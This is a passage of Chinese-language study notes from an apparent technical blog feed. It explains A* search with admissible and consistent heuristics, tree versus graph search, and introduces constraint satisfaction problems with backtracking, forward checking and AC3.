Search 的 expanding strategy 是按照<strong>当前步的累计 cost（理解为“深度”）<code>g(n)</code> 来评定的</strong>，而 Greedy Search 的 heuristic function 是按照<strong>距离 goal 的加权路径距离和 <code>h(n)</code> 来评定的</strong>。将 <strong>这两个标准相加得到 A* 的评价标准 <code>f(n)</code></strong>，这样既考虑到了下一步的 cost，又考虑到了距离终点的相对位置，达到了一个较好的效果。</p><blockquote><p>因为如果仅仅是 Uniform cost search，则要搜索 6 个结点才能找到 optimal solution；仅用 Greedy Search 只能找到非 optimal 的解；而用 A-star search 只需搜索 4 个结点就找到了 optimal solution.</p><p>有同学可能会问，为什么上面图中 <code>e</code> 结点的 h = 1 而不是 2？因为这和 heuristic function 的取法有关系。这里可能不是到达终点的路径长度和，而是直线距离。</p><p>思考：为什么只能在结点出队的时候才能检查它是不是 goal 然后再结束？进队的时候不行吗？</p><p>答案：不行。进队的时候，没法保证该结点一定比 fringe 内其他所有结点都要优；</p></blockquote><ul><li><p><strong>A* 算法不一定是 optimal 的</strong>，因为可以举出反例：</p><p><img src="imgs/AStar_counterExample.png" height="200px"></p><p>上面的反例可以看出，<strong>如果 heuristic function 函数没有选好，选的过于 pessimistic，那么很有可能会误导 agent，导致正确的 optimal solution 迟迟无法出队</strong>，这就是 A* 不一定 optimal 的原因——<strong>heuristic function 选取失误</strong>。</p></li><li><p>为了减少以上情况的出现，即优化这个算法，我们引入 <strong>Admissibility</strong> 来评价一个 heuristic function：</p><ul><li><p>如果 heuristic function 在<strong>任意</strong>结点的值 $h(n)$ 小于等于实际到 optimal solution 的加权路径长度 $h^<em>(n)$（<strong>我们在不知道结果前时无法得知，但它数学上客观存在</strong>），那么称为 <strong>optimistic heuristic function</strong>，这样的 A\</em> Search 会得到 optimal solution；</p><blockquote><p>即 optimistic (admissible) heuristic function 的定义为：</p><script type="math/tex; mode=display">\forall\space node\space n,\space 0\le h(n)\le h^*(n)\Longrightarrow h(n)\space is\space admissible</script></blockquote></li><li><p>如果 heuristic function 在某一结点的值大于实际到 optimal solution 的加权路径长度，则称为 <strong>pessimistic heuristic function</strong>，这样的 A* Search 很可能无法得到 optimal solution；</p></li></ul><p><strong>重要的是，虽然我们不知道 $h^*(n)$，但这已经足以我们判断一些情况下使用 A* Search 能否得到 optimal solution了</strong>：</p><p>例如在 pac-man game 的例子中，如果取到 goal 的 Manhattan distance 为 heuristic function，那么<strong>它一定是 optimistic 的，所以用 A* Search 一定能得到正确的 optimal solution</strong>（因为 Manhattan distance 考虑没有墙的情况下的距离，一定是乐观的）；</p><p>再例如在 pancake problem 的例子中，如果取 <strong>错位的薄饼的最大编号</strong> 为 heuristic function，那么 <strong>它也一定是 optimistic 的</strong>（因为你至少还要移动编号个数的薄饼次数才能达到 goal）；</p><p><strong>所以到目前为止，选取 heuristic function 的标准一个是举例子看看在某些结点上，$h(n)$ 是否接近 $g(n)$；另一个就是看看能否判断出 optimistic (admissible)，如果能，则能证明 A* Search 算法的 optimality，那么一定比 Uniform Cost Search 要好</strong>。</p></li></ul><h3 id="1-4-4-拓展：A-Search-的-optimality-证明"><a href="#1-4-4-拓展：A-Search-的-optimality-证明" class="headerlink" title="1.4.4 拓展：A* Search 的 optimality 证明"></a>1.4.4 拓展：A* Search 的 optimality 证明</h3><blockquote><p><strong>为啥取了 admissible 的 heuristic function，A* Search 就一定是 optimal 的？</strong></p></blockquote><p><strong>定义命题：</strong></p><script type="math/tex; mode=display">P:\quad h(n)\space is\space admissible\Longrightarrow A^*\space Search\space is\space optimal</script><p>下面证明命题 $P$：</p><ol><li><p>假设 A* Search tree 如下图所示，具有一个 optimal solution A 和 suboptimal solution B，由于二者的任意性，所以只要能证明 A 能在 B 之前出队并 expand，则就能证明 $P$；</p></li><li><p>再假设 B 在 fringe 中的情况（即 B 在搜索队列中），否则 $P$ 直接成立；</p></li><li><p>再假设 A 或 A 的祖先结点一定在 fringe 中，否则<strong>A 及其祖先节点一定都已经 expand 完毕了（因为 A，至少 A 的祖先节点，是 $f(n)$ 值小于 B 的 “候选结点”）</strong>，这个时候 $P$ 也直接成立；所以记在 fringe 中的 A 或其祖先结点为 n，如下图所示；</p></li><li><p>则可以证明 $f(n)\le f(A)$：由 $f(n)$ 的定义可知，$f(n)=g(n)+h(n)$，再由 admissibility 的定义可知，</p><script type="math/tex; mode=display">h(n)\space is\space admissible\Longrightarrow h(n)\le h^*(n)\Longrightarrow g(n)+h(n)\le g(n)+h^*(n)</script><p><strong>即 $f(n)\le g(A)$</strong>；再根据 heuristic function 的定义，$h(A)=0$，所以 $g(A)=f(A)$，进而得出 $f(n)\le f(A)$；</p></li><li><p>能够证明 $f(A)\lt f(B)$：由 suboptimal solution 的定义，$g(A)\lt g(B)$，由于 $h(A)=h(B)=0$，所以 $f(A)\lt f(B)$；</p></li><li><p>由第 4 条和第 5 条，能够证明 n 必然在 B 之前 expand，即 $f(n)\lt f(B)$（因为 $f(n)\le f(A)\lt f(B)$）；</p></li><li><p><strong>由于祖先结点 n 的任意性，所以 A 或 A 的祖先结点一定都在 B 之前 expand</strong>，所以 任意的 optimal solution A 一定在 suboptimal solution B 之前 expand，因此 A* Search 的 solution 必然是 optimal solution，$P$ 成立，原命题得证。</p></li></ol><p><img src="imgs/AStar_optimality_proof.png" height="200px"></p><blockquote><p>Q：为什么第 5 条 $f(A)\lt f(B)$ 不就能说明 A 在 B 前 expand 了吗？</p><p>A：其实不然，我们在第 5 条的时候还缺少一个条件——我们当时还不能证明 A 结点一定在 fringe 当中。我们只知道 A 的祖先结点在 fringe 当中。</p></blockquote><h3 id="1-4-5-How-to-Create-Admissible-Heuristic-Functions"><a href="#1-4-5-How-to-Create-Admissible-Heuristic-Functions" class="headerlink" title="1.4.5 How to Create Admissible Heuristic Functions ?"></a>1.4.5 How to Create Admissible Heuristic Functions ?</h3><ul><li><p>example: 8 puzzle（8 格华容道）</p><p><img src="imgs/8puzzles.png" height="275px"></p><ul><li>取法 1：状态结点 n 中，错位的数字数目定为 heuristic function $h(n)$，此时易得 $h(n)$ 是 admissible 的；</li><li><strong>结论 1</strong>：<strong>将原问题转化为 relaxed-problem heuristic 来讨论</strong>，例如在 8-puzzle 里面，如果能够直接把数字拆下来，直接安装到正确位置，那么这个问题就变简单了，action 数目一定变少了，而这个新问题就叫做 <strong>relaxed-problem</strong>；显然有：<strong>新问题的总步数（cost）小于原问题的 optimal solution 的步数（cost）</strong>；</li><li>取法 2：状态结点 n 中，所有数字距离正确位置的 Manhattan distance 的总和定为 $h(n)$，这个做法就是上述结论的应用。这种取法对应的 relaxed-problem 是 <strong>忽略数字方块之间的格挡限制</strong>，可以证明这种取法的 $h(n)$ 不仅是 admissible 的，而且<strong>比取法 1 更接近真实 optimal solution 的 cost</strong>；</li></ul></li><li><p><strong>总而言之，Heuristic function 的选取就在 <u>node expansion 的空间消耗</u> 和  $h(n)$ <u>计算的时间消耗</u> 之间抉择、权衡</strong>。但一般无论哪个方向，都<strong>必须要是 admissible 的（因为如果不是的话，就不能保证 A* Search 的 optimality，那还不如用 Greedy search）</strong>。</p><ul><li>要么 $h(n)$ 选取一些 admissible 且方便计算的函数，但平均需要更多的 node expansion 才能找到 optimal solution；</li><li>要么 $h(n)$ 选取一些 admissible 且更接近真实 optimal solution cost 的函数，但一般平均需要花费更长时间才能计算出 $h(n)$ 在某一结点的值；</li></ul></li><li><p><strong>结论 2</strong>：两个 admissible heuristic function 的最大值函数一定是更接近于真实 optimal solution cost 的 admissible heuristic function；如下图：</p><p><img src="imgs/h_semilattice.png" height="300px"></p><blockquote><p>注：如果 $\forall n,\space h(n)=0$，则 A* search 退化为 Uniform Cost Search（相当于提供 goal 的信息被 “磨平了”，各结点处都一样了）</p></blockquote></li></ul><h3 id="1-4-6-From-Tree-Search-to-Graph-Search"><a href="#1-4-6-From-Tree-Search-to-Graph-Search" class="headerlink" title="1.4.6 From Tree Search to Graph Search"></a>1.4.6 From Tree Search to Graph Search</h3><p>前面说的算法，从 uninformed search (DFS、BFS、Uniform Cost Search) 到 informed search (Greedy Search、A* Search)，都借助了 <strong>Tree Search</strong> 的思想，没有标注 visited 结点，导致大量重复冗余的 node expansion（同一状态结点入队多次）。</p><p>我们借鉴图算法的思想，只需要在前面 Tree Search 算法中 <strong>expansion strategy 前</strong> 加入 visited 判断，即可变成 Graph Search。具体实现方法可以借助 <strong>closed set</strong>（闭集，就是集合结构的数学名称）（别用列表，因为<strong>线性表查找元素是否存在的时间复杂度远大于集合结构</strong>）</p><p>易得，<strong>Tree Search 算法和同等的 Graph Search 算法的 complete 性质相同</strong>。因为它们理论上都能遍历完有限结点。</p><p>但！<strong>转换为 Graph Search 后，却不一定有同等的 optimality</strong>。因为在某些情况下，如果某些 admissible heuristic function 选的不好，很有可能导致 visited 会放弃掉 optimal solution，例如下面这种情况：</p><p><img src="imgs/AStarGraph_counterExample.png" height="270px"></p><p><strong>这是因为 heuristic function 选取的不一致性（inconsistency）导致的</strong>，通常是因为<strong>两个结点之间的 $h(n)$ 值之差大于它们间的 cost</strong>，导致其中一个结点<strong>需要第二次进队才有可能找到 optimal solution</strong>。这里结点 A 和 C 之间就存在这个问题，$h(A)-h(C)=3\gt cost(A,C)=1$，所以当 C 结点在 A* Tree Search 第二次进队时，才算 optimal solution。如果贸然转换为 Graph Search，就会丢失这个 optimal solution。</p><p>所以，考虑对于一个 admissible heuristic function，如果每两个结点之间的 $h(n)$ 值之差必然小于等于它们之间的 cost，<strong>所以称这个 admissible heuristic 为 consistent 的</strong>。</p><p>只有 heuristic function 是 consistent 的，<strong>越靠 fringe 后面弹出的 node，其 $f(n)$ 越大，越不可能是 optimal solution</strong>，否则不能满足这个特性。</p><p><img src="imgs/consistency_of_heuristics.png" height="275px"></p><ul><li>性质 1： <strong>Consistency 蕴含（implies）Admissibility</strong>（一个 consistent heuristic function 一定是 admissible heuristic function）；</li><li>性质 2：只有选取了 Consistent heuristic function，A* Graph Search 才能保证 optimality，但 A* Tree Search 只需要 Admissible heuristic function 就能保证 optimality；</li></ul><p>因此，<strong>如果选取的 heuristic 具备 consistency</strong>，那么将之前的所有 Tree Search 算法加上 visited 判断变成 Graph Search 算法，均不改变其 completion 和 optimality，并且可以减少 node expansion 的数目，实现算法的优化。</p><p><strong>值得庆幸的是，大部分自然得到的 admissible heuristic functions 都是 consistent 的，尤其是由 relaxed problems 取得的</strong>。所以大可以认为，用 relaxed problems 方法取得的 heuristic functions 都具有 consistency，而无需证明。</p><p>上面的 “一致性” 比较抽象，有位知乎网友 <code>@Hepta</code> 解释的好，截下来给大家参考：</p><p><img src="imgs/zhihu_explain.png" height="400px"></p><p>这可以认为，这个 heuristic function 取得确实是 admissible（每个结点的 $h(n)$ 总趋势都是越接近 goal 就越接近0，并且是<strong>乐观估计</strong>的），但是每个路线上的 “乐观估计程度不相同”，如果存在一种情况：<strong>一个实际更长（cost 更大）的路径比一个实际更短（cost 更小）路径的 $h(n)$ 更乐观——即虽然它们各自都正确反映了 goal 远近的性质（admissible），但相对远近反映不一致（inconsistent），这就是 heuristic function 的不一致性</strong>。</p><p>这种不一致就会影响搜索，导致<strong>suboptimal solution 的路径比 optimal solution 的路径更快到达 solution <u>附近停下来</u></strong>（但总体受到 admissible 的限制，suboptimal solution 不会先进队的），所以这个时候如果附近的结点又恰好唯一，并且还有 visited 不允许重复进队，那么 optimal solution 的路径就会被 suboptimal solution 的路径截断，造成错误地丢失正确最优解。</p><p>所以上面说 “relaxed problems 得到的 admissible heuristic function 都有 consistency” 是符合一般规律的，故意设计的 heuristic function 可能不满足 consistency、满足 admissible，但它一般不能从 relaxed problems 得出。</p><h3 id="1-4-7-补充：Dijkstra-Algorithm-amp-A-Algorithm"><a href="#1-4-7-补充：Dijkstra-Algorithm-amp-A-Algorithm" class="headerlink" title="1.4.7 补充：Dijkstra Algorithm &amp; A* Algorithm"></a>1.4.7 补充：<code>Dijkstra</code> Algorithm &amp; A* Algorithm</h3><p>其实细心的同学已经发现，<code>Dijkstra</code> 算法不就是 A* 算法的特殊情况嘛！当我们仅仅以当前步累计的 cost（去掉距离 goal 的 cost）作为 heuristic function 时，A* 算法就退化为了 <code>Dijkstra</code> 算法。</p><p>它们都只能解决非负边权值图的最短路径问题。</p><h2 id="1-5-Summary"><a href="#1-5-Summary" class="headerlink" title="1.5 Summary"></a>1.5 Summary</h2><p>本章讲述了 <strong>搜索问题</strong> 的基本定义和算法。我们可以总结出：</p><ul><li><p>搜索问题的使用场景：用于一类很特定的问题，它们满足搜索问题的模板。例如地图导航的最短路搜索、没有敌人并且是去往特定位置的 pac-man 游戏；</p></li><li><p>搜索问题中 Agent 的性质：<strong>Planning Agent</strong>，即先根据算法计算，得出一系列动作序列之后再行动，<strong>更关注 master-mind，即固定的动作序列解法来得到最优解</strong>；</p></li><li><p>搜索问题的前提假设：单个 Agent（<strong>没有其他 agent 做出不确定 (uncertain) 或者对抗性 (adversarial) 的 actions 对当前 agent 造成影响</strong>）、可决定的 Actions、完全可观测的 States、离散的 State space；</p></li><li><p>搜索问题的目标</p><ul><li><p><strong>获取路径</strong>：此时 Agent 的性质是 <strong>Planning Agent</strong>，即先根据算法计算，得出一系列动作序列之后再行动，<strong>更关注 master-mind，即固定的动作序列解法（即路径）来得到最优解</strong>；</p><blockquote><p>本章讲述的几乎所有内容都是关于这个方面的；</p></blockquote></li><li><p><strong>获得结果</strong>：此时动作序列并不重要，只关心这个动作序列能否达到 goal；通常这种目标下不会考虑 costs；</p></li></ul></li></ul><p>所以搜索问题的假设很多，在这个问题基础上，我们添加了一些信息，例如路径是否等权？权重大小多少？是否可以用 goal 信息来 inform 搜索的方法？</p><p>对应的算法常见的有：Tree Search 的 DFS、BFS、UCS（都是 uninformed）和 Greedy Search、A Star Search；进一步进行改进还有对应的 Graph Search。</p><p>以后几章，我们将一点点解除这些前提假设的限制，让问题发生变化，并探讨新问题的算法。</p><h1 id="Chapter-2-Constraint-Satisfaction-Problems-CSPs"><a href="#Chapter-2-Constraint-Satisfaction-Problems-CSPs" class="headerlink" title="Chapter 2. Constraint Satisfaction Problems (CSPs)"></a>Chapter 2. Constraint Satisfaction Problems (CSPs)</h1><h2 id="2-1-The-Introduction-to-CSP"><a href="#2-1-The-Introduction-to-CSP" class="headerlink" title="2.1 The Introduction to CSP"></a>2.1 The Introduction to CSP</h2><p>正如上一章总结所说，CSP 只是一种特殊的 “获取结果” 的 Search Problem，它对问题作了如下假设：</p><ul><li>状态空间是个<strong>黑盒</strong>，可以是任何数据结构，无法直接访问状态空间的信息；</li><li>目标测试也可以是任何形式的函数，也是黑盒，只能调用（即从结果上看是否达到目标）；</li><li>后继函数仍然是黑盒，你只能通过调用来取得可能的后继状态；</li></ul><p>因此我们可以问题抽象为新的数学表示：</p><ul><li>CSP 就是 Search Problem 的一个特殊子集，目标本质是找到 goal；</li><li>所有的<strong>状态</strong>可以被定义为一组变量：$X_i$，其值在定义域 $D$ 中变化（<strong>有的时候 $D$ 取决于 $i$</strong>）；</li><li><strong>后继函数</strong>的运作方法类似为这些状态变量赋值；</li><li><strong>目标测试</strong>就是一组<strong>限制条件（Constraints）</strong>，指明了最终的 goal，即可接受的<strong>状态序列（由可接受的一组 $X_i$ 的值组成）</strong>，这也是为什么这个问题被称为 “Constraint Satisfaction Problems”；</li></ul><p>它的应用相当广泛，生活中几乎都能见到。</p><h3 id="2-1-1-Example-1-地图上色"><a href="#2-1-1-Example-1-地图上色" class="headerlink" title="2.1.1 Example 1: 地图上色"></a>2.1.1 Example 1: 地图上色</h3><p>举一个例子，计算机证明 <strong>四色定理</strong> 时需要正确地为地图分配颜色。现在我们想要为地图上一片有划分的区域填色，要求<strong>相邻区域颜色不得相同</strong>。具体做法如下：</p><ol><li>首先把问题抽象为 CSP。很显然，问题的<strong>状态可以由一组区域变量表示</strong>，其定义域为各自不同颜色组成的集合，这里假设有 6 个区域，在 $x_1\sim x_6$；</li><li>这里可以把颜色定义域设置为 3 种颜色：<code>D = &#123; red, green, blue &#125;</code>；</li><li>目标测试（限制条件）<ul><li>Implicit（隐含）：adjacent regions must have different colors（体现在代码中就是每两个相邻区域变量不相等）；</li><li>Explicit（明确）： $(x_i,x_j)\in\{(red,green),(red,blue),\cdots\}$；</li></ul></li><li>解决方案（solution）：就是一组或多组符合限制条件的 $x_i$ 的赋值（assignments），<strong>CSP 问题的解只需要找到一个解即可</strong>；</li></ol><hr><p>除了使用变量 + 限制条件的方法，还有一种方法可以描述 CSP 问题：<strong>Constraint Graphs</strong>：</p><ul><li><p>每个变量由图中的一个结点代替；</p></li><li><p><strong>如果限制条件是 二元 的</strong>（是/否、有/无、等于/不等于，等等），那么可以用结点之间是否连接边来表示；</p><blockquote><p>注意：<strong>限制图的边只是表示哪里有限制，没有说明限制是什么</strong>，所以应该是二元的限制条件；</p></blockquote></li></ul><p>这种<strong>最多每两个变量之间</strong>具有<strong>二元限制条件</strong>的 CSP  问题被称为 Binary CSP，对应的限制图被称为 Binary Constraint Graph；</p><p>相对应的还有<strong>一元限制条件（Unary Constraint）</strong>，即指定变量必须为某特定值；后面会具体说。</p><h3 id="2-1-2-Example-2-N-Queens-问题"><a href="#2-1-2-Example-2-N-Queens-问题" class="headerlink" title="2.1.2 Example 2: N-Queens 问题"></a>2.1.2 Example 2: N-Queens 问题</h3><p>我们听过 “八皇后问题”，那么对于 N-皇后问题，除了使用递归+回溯的经典解法，还可以将其转化为 CSP 求解：</p><ul><li><p>表示方法 1：逐格表示</p><ul><li><p>状态：就是 N × N 的数组，用于保存其上是否存在 “皇后” 棋，定义域为 <code>&#123;0, 1&#125;</code>；</p></li><li><p>目标测试（限制条件）：</p><ol><li>$\forall i,j,k\space(X_{ij},X_{ik})\in\{(0,0),(0,1),(1,0)\}$（不能在同一行）</li><li>$\forall i,j,k\space(X_{ij},X_{kj})\in\{(0,0),(0,1),(1,0)\}$（不能在同一列）</li><li>$\forall i,j,k\space(X_{ij},X_{i+k,\space j+k})\in\{(0,0),(0,1),(1,0)\}$（不能在对角线下半部分）</li><li>$\forall i,j,k\space(X_{ij},X_{i+k,\space j-k})\in\{(0,0),(0,1),(1,0)\}$（不能在对角线上半部分）</li><li>$\sum_{i,j}X_{ij}=N$；</li></ol></li></ul></li><li><p>表示方法 2：列表示</p><ul><li>状态：第 $k$ 行的 queen 位于的列数 $Q_k$，定义域为 <code>&#123;1, 2, ..., N&#125;</code>；</li><li>限制条件：$(Q_1,Q_2)\in\{(1,3),\space(1,4),\cdots\}$ ……;</li></ul></li></ul><h3 id="2-1-3-Example-3-Cryptarithmetic-加密运算"><a href="#2-1-3-Example-3-Cryptarithmetic-加密运算" class="headerlink" title="2.1.3 Example 3: Cryptarithmetic 加密运算"></a>2.1.3 Example 3: Cryptarithmetic 加密运算</h3><p>例如对加法式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    T W O</span><br><span class="line">  + T W O</span><br><span class="line">-----------</span><br><span class="line">  F O U R</span><br></pre></td></tr></table></figure><p>解出每个字母所代表的数字（0 ~ 9）；可以抽象出如下 CSP 问题：</p><ul><li>变量 F、T、U、W、R、O、C1（第一位进位）、C2、C3；定义域 <code>&#123;0,1,...,9&#125;</code>；</li><li>限制条件<ul><li>alldiff(F, T, U, W, R, O)，字母各不相同；</li><li>O + O = R + 10 * C1, ……;</li></ul></li></ul><h3 id="2-1-4-Example-4-Sudoku"><a href="#2-1-4-Example-4-Sudoku" class="headerlink" title="2.1.4 Example 4: Sudoku"></a>2.1.4 Example 4: Sudoku</h3><p>对于数独而言，转化为 CSP 可以是：</p><ul><li>变量即每一个没有填数的方块，定义域 0 ~ 9 的整数；</li><li>限制条件<ul><li>每一行所有元素不得相同；</li><li>每一列所有元素不得相同；</li><li>每一小正方形区域所有元素不得相同；</li><li>本身填有数的方块为 Unary Constraint，要求必须为某个数字；</li></ul></li></ul><h3 id="2-1-5-Example-5-The-Waltz-Algorithm-Deprecated"><a href="#2-1-5-Example-5-The-Waltz-Algorithm-Deprecated" class="headerlink" title="2.1.5 Example 5: The Waltz Algorithm (Deprecated)"></a>2.1.5 Example 5: The Waltz Algorithm (Deprecated)</h3><p>早期计算机视觉使用这个算法来识别 3D 图形的顶点是向外凸，还是向内凹。基本原理是：将立体中的所有顶点作为一个变量，限制条件就是<strong>相邻两个点不能一个是凸顶点，一个是凹顶点</strong>；</p><h2 id="2-2-Varieties-of-CSPs"><a href="#2-2-Varieties-of-CSPs" class="headerlink" title="2.2 Varieties of CSPs"></a>2.2 Varieties of CSPs</h2><h3 id="2-2-1-Varieties-of-Variables"><a href="#2-2-1-Varieties-of-Variables" class="headerlink" title="2.2.1 Varieties of Variables"></a>2.2.1 Varieties of Variables</h3><p>研究 CSPs 算法前，先弄清楚 CSPs 的详细信息。首先 CSP 总的来说有两种变量类型：</p><ul><li>离散型变量（Discrete Variables）<ul><li>有穷定义域（$card(D)=d$）：存在 $O(d^n)$ 种完全指配；例如 二元 CSP，有些是 NP-完全 问题；</li><li>无穷定义域（整型、字符串等）：更加困难，例如工作安排问题（某些问题必须在另一些问题之前完成）；<strong>仅线性约束可解</strong>。</li></ul></li><li>连续型变量（Continuous Variables）<ul><li>例如与时间变化有关的问题，<strong>线性约束可解，并且是多项式时间内可以利用 LP 方法完成</strong>；</li></ul></li></ul><h3 id="2-2-2-Varieties-of-Constraints"><a href="#2-2-2-Varieties-of-Constraints" class="headerlink" title="2.2.2 Varieties of Constraints"></a>2.2.2 Varieties of Constraints</h3><ul><li><p>Unary Constraint：<strong>与单个变量有关，等价于减小定义域</strong>，例如：$x=1$、$y\ne2$；</p></li><li><p>Binary Constraint：<strong>仅与一对变量有关</strong>，例如：$x=y$、$a\ne b$；</p></li><li><p>Higher-order Constraint: involve 3 or more variables，例如 2.1.3 加密计算；</p></li><li><p>Soft Constraint: Preferences（非强制的倾向），实现方法是<strong>加权，并且转化为限制优化问题</strong>；</p><blockquote><p>本章会忽略这种情况，到 <strong>贝叶斯网络</strong> 再讨论这个问题。</p></blockquote></li></ul><h2 id="2-3-The-formulations-for-Binary-CSPs"><a href="#2-3-The-formulations-for-Binary-CSPs" class="headerlink" title="2.3 The formulations for Binary CSPs"></a>2.3 The formulations for Binary CSPs</h2><blockquote><p>本节仅讨论 <strong>Constraint 至多与 2 个变量有关</strong>的问题。</p></blockquote><h3 id="2-3-1-Standard-Search-Formulation"><a href="#2-3-1-Standard-Search-Formulation" class="headerlink" title="2.3.1 Standard Search Formulation"></a>2.3.1 Standard Search Formulation</h3><p>一种常用解决 CSP 问题的方法被称为 Standard Search Formulation，方法将 CSP 问题看作一种特殊的搜索问题，定义如下：</p><ul><li>状态：defined by the values assigned so far；</li><li>初始状态：空指派；</li><li>后继函数：为一个没有指派的变量从定义域种指派一个值；</li><li>目标测试：当前指配是否为完全指派，并且满足所有约束条件；</li></ul><p>现在讨论这种思路下的算法，从最原始的方法开始来一步步优化。</p><p>现在以上面任一个 Example 为例。</p><h4 id="BFS-遍历"><a href="#BFS-遍历" class="headerlink" title="BFS 遍历"></a>BFS 遍历</h4><p>我们考虑最原始的 BFS 遍历，发现这是最差的算法，没有之一。因为这个问题中，所有的解法都在搜索树的最底层。意味着 BFS 需要遍历几乎所有状态才能找到至少一个解。我们大可以直接放弃这个方法。</p><h4 id="DFS-遍历"><a href="#DFS-遍历" class="headerlink" title="DFS 遍历"></a>DFS 遍历</h4><p>在这个问题中，DFS 方法要比 BFS 好一些，<strong>所以这一节中接下来的优化算法都基于此</strong>。这和上一章解决普通 Search Problem 的思路不一样，那个时候的算法几乎都从 BFS 的思路出发（UCS / A Star）。</p><p>实现思路是先一步步沿搜索树向下指派变量，<strong>全部指派结束后，再检查目标测试</strong>，不满足则从栈中弹出最上面的赋值（最后一个赋值），换一个值，如此递归进行。</p><p>实现思路简单，但是非常繁琐，接下来进行优化。</p><h4 id="Backtracking-Search"><a href="#Backtracking-Search" class="headerlink" title="Backtracking Search"></a>Backtracking Search</h4><p>是一种解决 CSP 的 basic uninformed algorithm，思路如下：</p><ul><li><p>一次仅对一个变量进行操作</p><ul><li><strong>变量指派是可交换顺序的，所以首先定下顺序</strong>（例如先赋值 $x=1$，再赋值 $y=2$ 和 先赋值 $y=2$，再赋值 $x=1$ 是等价的），只要将定义域排序，并且按序指派就能实现；</li><li><strong>每一步只需要考虑一个单独变量的指派</strong>；</li></ul></li><li><p><strong>每一步都检查限制条件</strong>：一旦违反条件，立即更换当前最近一次的指派。</p><blockquote><p><strong>这主要因为 CSP 问题在前一步违反条件后，后面指派就没有机会弥补，或者说使状态重新符合条件</strong>。类似一种剪枝。</p></blockquote></li></ul><p>使用以上两个思路优化的 DFS 被称为 Backtracking Search（回溯搜索）；</p><p>这种算法在解决 Example 2 的 N-queens 时，能够解出在 N ≤ 25 范围的问题。</p><p><img src="imgs/backtracking_search_pseudo_code.png" height="300px"></p><p>现在考虑 backtracking 能否继续优化？从以下方面考虑：</p><ul><li>指派定义域排序：<strong>下一个先指派定义域中的谁？按什么顺序？</strong></li><li>中途过滤：<strong>能否在违反限制之前就检测到可能的风险，并且尽早规避？</strong>（使得递归深度减小）</li><li>数据结构：能否进一步改进问题的数据结构，使其更高效？</li></ul><p>先从方便下手的部分开始：中途过滤。</p><p><strong>优化方案 1: Forward Checking</strong></p><p>思路之一是 <strong>Forward Checking</strong>，在为一个变量指派时，同时根据限制<strong>缩小其他变量（必须仅仅是有限制联系的，no further）的定义域</strong>（排除不符合限制的取值）。一旦发现有变量的定义域为空，则提前检测到了违反限制的情况，所以提前排除这种指派，重新为当前变量指派。</p><blockquote><p>In general, forward checking is going to propagate information from assigned values to unassigned values, but <strong>doesn’t provide early detection for all failures</strong> (looming conflicts between unassigned and other unassigned variables).</p></blockquote><p><strong>优化方案 2: Rich Filtering Algorithm - Graph Arc Consistency Checking</strong></p><p>这种方法还可以继续向前预测，因为在地图上色例子中，当地图两个相邻区域定义域只有相同颜色时，也希望被提前检测到。这就需要 <strong>reason from constraint to constraint</strong>（从一个限制条件推广传递至另一个），用到的技术是 <strong>arc consistency</strong>（限制图有向边一致性，<strong>arc 和 edge 都可以指图的边</strong>）。</p><p>在 Forward Checking 中，我们让每一步都按照<strong>给定的限制条件检查并更新定义域</strong>，但是某些限制条件之间可以推出另外的限制条件，让违反限制的情况更早地被检查到。我们可以通过 <strong>arc consistency</strong> 来检查。</p><p>首先给出 arc consistency 的定义：<strong>在限制图中，对于一个 constraint 对应的有向边，如果对起始结点（tail）当前定义域中<u>任意</u>指派，终止结点（head）当前定义域中都<u>存在</u>一个指派，使得二者不违反 constraint，则称这条边是一致的</strong>。</p><p>因此，我们可以发现，前面的 forward checking <strong>只是保证了指向 new assignment（head）的任意有 constraint 结点（tail）的边具有 consistency，没有检查 “unassigned 结点之间边的 consistency”</strong>。</p><p>所以，新方法应该一开始把所有的边放在一个集合中等待遍历。每一轮检查限制条件、更新定义域时，同时对其他所有有 constraint 相连的结点也进行检查（对于 unassigned 结点，一般是双向的），<strong>如果不满足，那么从起始结点的定义域中移除违反限制的取值</strong>（正是因为从起始结点移除，所以 arc consistency 的定义是 ”起始结点任意指派 -&gt; 终止 结点存在指派“）。<strong>非常难过的一点是，如果我们正在遍历 arc 检查 consistency 时，对某个结点（tail）移除了一个 value，那么之前所有指向这个结点（这时作为 head）所建立的 consistency 都不一定成立了，需要重新检查所有指向这个结点的边的 consistency</strong>。</p><p>这个优化算法的名称叫做 <strong>Forward Checking + AC3</strong>，可以保证每次指派后，限制图都有 graph arc consistency。</p><p>这个时候，我们发现每指派一步所进行的 checking 步骤（即 Graph Arc Consistency Checking）过于复杂，以至于我们应该把这个步骤单独提出为一个函数，如下：</p><p><img src="imgs/AC3.png" height="350px"></p><p>每次我们递归地指派一个结点的值，我们在检查是否违反 constraint 的时候，都要调用一次 <code>AC3</code> 函数，进行如下检查：</p><ol><li>获取当前所有结点变量及其定义域，并将限制图中每条<strong>有向边</strong>（如果限制条件是无向的，就等价于放双向边）都放入一个队列中；</li><li>当队列非空时，从队列取出一条有向边（限制条件），检查边的一致性（使用定义），如果违反，那么删去起始结点定义域中导致冲突的值，并且将当前边的起始结点<strong>作为终止结点时的</strong>所有边放入队列，等待重新检查一致性（代码就是 <code>REMOVE-INCONSISTENT-VALUES</code>）；</li><li>重复第 2 步直至队列中没有边（所有边都通过了一致性检查，又或者至少有一条边的定义域为空，即当前指派无解）；</li></ol><p>这里大家会发现，虽然这个算法确实提前避免违反限制的情况，但是时间复杂度是肉眼可见的大（时间复杂度 $O(n^2d^3)$，通过数据结构优化可以达到 $O(n^2d^2)$，n 为结点数量级，d 为 每个结点变量的定义域大小数量级）。所以这里就需要在 <strong>详细的检查以在浅处避免违反限制</strong> 和 <strong>简单的检查但平均递归深度较大时才能发现违反限制并放弃</strong> 这两种情况抉择。</p><blockquote><p>如果数据结点相当多，不希望递归深度很大，那么 AC3 算法为优；如果限制条件相当多，结点数又相对较少，不希望在检查上浪费太多时间，那么 forward checking 算法为优。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-0-Intro&quot;&gt;&lt;a href=&quot;#Chapter-0-Intro&quot; class=&quot;headerlink&quot; title=&quot;Chapter 0. Intro&quot;&gt;&lt;/a&gt;Chapter 0. Intro&lt;/h1&gt;&lt;h2 id=&quot;0-1-The-def</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="AI" scheme="https://blog.sjtuxhw.top/tags/AI/"/>
    
    <category term="Algorithm" scheme="https://blog.sjtuxhw.top/tags/Algorithm/"/>
    
  </entry>
  
